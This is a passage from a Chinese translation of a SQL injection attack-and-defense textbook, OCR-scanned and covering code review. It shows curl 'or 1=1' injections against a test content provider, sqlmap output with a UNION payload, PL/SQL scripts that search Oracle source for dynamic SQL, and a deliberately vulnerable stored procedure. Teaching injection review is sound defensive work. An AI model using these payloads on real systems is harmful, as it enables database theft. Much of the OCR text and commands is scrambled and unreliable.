Query successful:
Column count1 3
Row count: 1
1_id 1 suggest_text_1 I suggest_intent_data
111223 1 secret text 1 11223
实际执行的SQL语句如下所示：
91
---
## Page 106
SQL注入攻击与防御（第2版）
SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data
FROM notes WHERE (_id=11223)
接下来可以对该内容提供程序进行SQL注入测试：
S *cur1 http://127.0.0.1: 8080/query?a=org.sapmentors.sapnoteview,
noteprovider?6se1Name=_id&se1Id=11223820or&201=1
Query successful:
Column count: 3
Row count: 4
1_id 1 suggest_text_1 1suggest_intent_data
|11223 | secret text |11223
112345 1 secret text | 12345
154321 | super secret text 1 54321
198765 1 shhhh secret 198765
实际执行的 SQL语句如下所示：
SELECT _id, title AS suggest_text_l, _id AS suggest_intent_data
FROM notes WHERE (_id=11223 or 1=1)
请注意，selName和selId这两个参数都是易感染的。使用Sqlmap可以自动利用这两个漏洞：
*sxoquaudes*6xo=exanb/o8og:t*0*o*czt//1dau n- Ad deutbs/* s
sapnoteviev,noteprovider?&selName=_id6selId-11223* -b --dbms=sqlite
sqlmap/1.0-dev (r4409) - automatic SQL injection and database
takeover tool
http: / /www.sq1map . org
prior mutual consent is illegal. It is the end user's responsibility
to obey all applicable local, state and federal laws. Authors assume
no liability and are not responsible for any misuse or damage caused
by this program
[*]starting at 18:12:33
[18:12:33] [INF0] using */Users/nmonkee/toolbox/app1ication/sqli/
sqlmap/output/127.0.0.1/session* as session file
[18:12:33] [INFo] testing connection to the target ur]
[18:12:33]
[INFo] testing if the url is stable, wait a few seconds
[18:12: 34]
[INFO] ur] is stable
[18:12:34]
[18:1.2: 34]
[1.8:1.2: 34]
[INFO] GET parameter 'a* is dynamic
not be injectable
[18:12: 35]
,e, xaqexed ao uo uogaoa(ug tbs butase [oa1] 
clause*
co1umns 
[1.8:12: 39]
[WARNING] GET parameter 'a' is not injectable
[18:12:39]
[18 :1.2 : 39]
92
---
## Page 107
第3章复查代码中的SQL注入
[18:12:39] [WARNING] heuristic test shows that GET parameter 'selName*
[18:12:39] [INFO] testing sq] injection on GET parameter *selName*
'might not be injectable
[18:12:39] [INFO] testing *AND booleanbased blind - WHERE or HAVING
clause'
[18:12:40] [INFO] ORDER BY technique seems to be usable. This should
columns *
reduce the time needed to find the right number of query columns.
Automatically extending the range for UNIoN query injection
technique
xenb uT suuntoo c oAeu o szeedde [zn qe5xea [oaNI] [Ts:2t:gt]
(NULL) - 1 to 10 columns* injectable
GET parameter 'selName′ is vulnerable. Do you want to keep testing the
others? [y/N]n
sqlmap identified the following injection points vith a total of 79
HTTP (s) requests:
Place: GET
Parameter: selName
Axonb NOINn :odA
Title: Generic UNION query (NULL) - 3 columns
Payload: a=org.sapmentors,sapnoteview.noteprovider?&selName=_id)
UNION ALL SELECT NULL, *:xhc:*II*xYEvUtVGE=′I1′:cbo:′, NULL- AND
(828=8286se1Id=11223
[18:12:46] [INFO] the back-end DBMS is  SQLite
[18:12:46]  [INFO]  fetching banner
back-end DBMS: SQLite
banner: '3.6.22'
[18:12:46] [INFO] Fetched data logged to text files under */Users/
nmonkee/too1box/app1ication/sq1i/sqlmap/output/127.0.0.1*
[*] shutting down at 18:12:46
3.2.5复查PL/SQL和T-SQL代码
Oracle 的 PL/SQL 代码与Microsoft 的 T-SQL(Transact-SQL，事务处理查询语言)代码差别
很大。大多数情况下，它们比传统的编程代码（例如PHP、.NET、Java等）更不安全。Oracle
直深受多种PL/SQL注入漏洞的困扰，这些漏洞位于数据库产品默认安装的内置数据库包的代
码中。PL/SQL代码以definer权限执行，并因此一直成为想寻找可靠方法来提升权限的攻击者
流行的攻击对象。正因为如此，Oracle不得不发布一份报告来告诉开发人员如何产生安全的
不过，存储过程既能够以调用者权限（authidcurrent_user)运行，也能够以存储过程所有者权限
（authid definer）运行。创建存储过程时，可以使用authid子句指定该行为。
对于复查代码的人，诸如T-SQL和PL/SQL这样的编程代码却没有存放在便于使用的文本
文件中。要分析PL/SQL程序的源代码，有两种选择。一种是将源代码从数据库导出来，可以
使用dbms_metadata 包实现该目标。可以使用下列SQL*Plus 脚本将DDL(Data Definition
93
---
## Page 108
SQL注入攻击与防御（第2版）
Language，数据定义语言）语句从Oracle数据库导出米。DDL语句是定义或修改数据结构（比如
表)的 SQL语句。因此，常见的 DDL语句是 creafe fable 或alter fable:
-- Purpose: A PL/SQL script to export the DDL code for all database objects
Version: v 0.0.1
Works against: Oracle 9i, 10g and 11g
Author: Alexander Kornbrust of Red-Database-Security GmbH
set echo off feed off pages 0 trins on term on trim on linesize 255
1ong 50o000 head off
execute DBMS_METADATA. SET_TRANSFORM_PARAM (DBMS_METADATA.SESSION
TRANSFORM, 'STORAGE', fa1se) :
spoo1 geta11unvrapped.sq1
fTenp wox ,xx*paddexxunooxnostpp toods, 4ootos
create a SQL scripts containing all unwrapped objects
select *select dbms_metadata-get_ddl(***Ilobject_type1 I***,***|1
object_namel!***,***11 ownerI(**+) from dual;*
from (select * from all_objects where object_id not in (select
o.obj# from sourceS s, obj$ o,user$ u where ((lower (s.source)
like *$functiontwrappeds′) or (lower (s.source)
1ike *$procedureliwrapped$*) or (lower (s.source) 1ike
'package&wrappeds*)) and o.obj#=s.obj# and u.user#=o,owner#))
where object_type in (′FUNCTION′, 'PROCEDURE′, *PACKAGE′, 'TRIGGER')
and owner in (*sYs*)
order by owner, object_type, object_name;
spool a spool off into the spool file.
select 'spool off' from dual;
spool off
generate the DDL_source
Bgeta1lunwrapped.sq1
quit
另一种方法是构造您自己的SQL语句来搜索数据库中感兴趣的PL/SQL代码。Oracle 在
ALL_SOURCE和DBA_SOURCE视图中存储PL/SQL源代码。也就是说，代码没有做混淆处
理（混消处理是一种将人可以阅读的文本转换成不容易阅读格式的技术)。可以通过访问两个视
图之一的 TEXT列实现该目的。最值得关注的是使用了execute immediate 或 dbms_sql 函数的
代码。Oracle的PL/SQL是区分大小写的，应该将搜索代码构造成EXECUTE、execute或ExEcUtE
等格式。一定要在查询中使用lower（text）函数，它会将文本值转换为小写字母以便LIKE语句
能匹配所有可能的情况。如果将未经验证的输入传递给这些函数（就像前面介绍的应用编程语
的源：
SELECT owner AS Owner, name AS Name, type AS Type, text AS Source FRCM
6
---
## Page 109
第3章复查代码中的SQL注入
dba_source WHERE ((LOWER(Source) LIKE *%immediate*) OR (LOWER (Source)
Owner
Name
Type
Source
PLSQL
DSQL
PROCEDURE
execute immediate (param) 
Owner
Name
Type
Source
PLSQL
EXAXPLE1
PROCEDURE
execute inmediate (*select 
count (*)
from *Ilparam) into 1
Owner
Name
Type
Source
PLSQL
EXAXPLE2
PROCEDURE
execute immediate (*select count (*)
from all_users where user_id='llparam)
into i;
搜索查询的输出结果表明存在三条需要进一步审查的语句，这三条语句容易受到攻击，因
为用户控制的数据未经验证就传递给了危险的函数。但是与应用程序开发人员类似，数据库管
理员（DBA）通常也是先将参数复制给局部定义的变量。可以使用下列SQL语句搜索那些将参数
值复制到动态创建的SQL字符串中的PL/SQL代码块：
SELECT owner AS Owner, name AS Name, type AS Type, text AS Source FROM
diba_source where 1ower (Source) 1ike *$:=&11*′*;
xeURO
Name
Type
Source
SYSMAN
SP_StoredProcedure Procedure
sql := *SELECT field FROM table WHERE
field = *"* II input *"**;
上述SQL语句找到了一个利用用户控制的数据动态创建SQL语句的包。我们有必要对该
包做进一步审查，可以使用下列SQL语句追溯包（package)的源以便进一步审查其内容：
SELECT text AS Source FROM dba_source WHERE name=*SP_STORED_PROCEDURE*
  , 
Source
1 CREATE OR REPLACE PROCEDURE SP_StoredProcedure (input IN VARCHAR2) AS
2 sq1 VARCHAR2;
3 BEGIN
4 sql:=*SELECT field FROM table KHERE field =*"* 11 input 11 *"*;
5 EXECUTE IMMEDIATE sql;
6 END;
在上述例子中，input变量直接来自用户输入并与SQL字符串sql相连。该SQL字符串作
为参数传递给了EXECUTE函数并被执行。即便用户输入是作为参数传递的，上述Oracle存储
过程也依然容易受到SQL注入攻击。
可以使用下列PL/SQL脚本搜索数据库中所有的PL/SQL代码，以找到易受潜在SQL注入
攻击的代码。我们需要仔细检查输出结果，因为这有助于缩小搜索范围：
-- Purpose: A PL/SQL script to search the DB for potentially vulnerable
-- PL/SQL code
-- Version: v 0.0.1
95
---
## Page 110
SQL注入攻击与防御（第2版）